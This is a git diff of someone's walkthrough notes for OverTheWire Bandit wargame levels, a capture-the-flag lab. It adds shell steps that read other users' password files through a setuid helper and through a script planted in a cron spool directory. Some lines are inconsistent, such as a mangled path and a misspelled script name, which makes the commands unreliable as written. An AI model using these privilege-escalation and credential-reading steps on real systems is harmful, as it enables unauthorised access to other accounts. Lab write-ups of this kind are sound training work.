@@ -307,7 +307,7 @@ file bandit20-do
 ls -ll bandit20-do
 groups bandit19
 #id -u
-#./bandit20-do id cat /etc/bandit_pass/bandit20
+#./bandit20-do id cat /etc/bandi>&t_pass/bandit20
 ./bandit20-do cat /etc/bandit_pass/bandit20
 ********************************
 exit
@@ -390,6 +390,34 @@ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 echo $mytarget
 ********************************
 cat /tmp/********************************
+********************************
+exit
+```
+
+## Level 23 `->` 24
+
+```bash
+cd /etc/cron.d
+ls -la
+cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+***** bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+
+mkdir /tmp/wenas
+touch /tmp/wenas/pass
+cat >> /tmp/wenas/gatovksyHacker.sh << EOF
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/wenas/pass
+EOF
+
+chmod 777 /tmp/wenas/pass
+chmod 777  /tmp/wenas/gatovksyHacker.sh
+
+cp /tmp/wenas/gatovskyHacker.sh /var/spool/bandit24/foo
+bash /usr/bin/cronjob_bandit24.sh 
+cat /tmp/wenas/pass
 ********************************
 exit
 ```
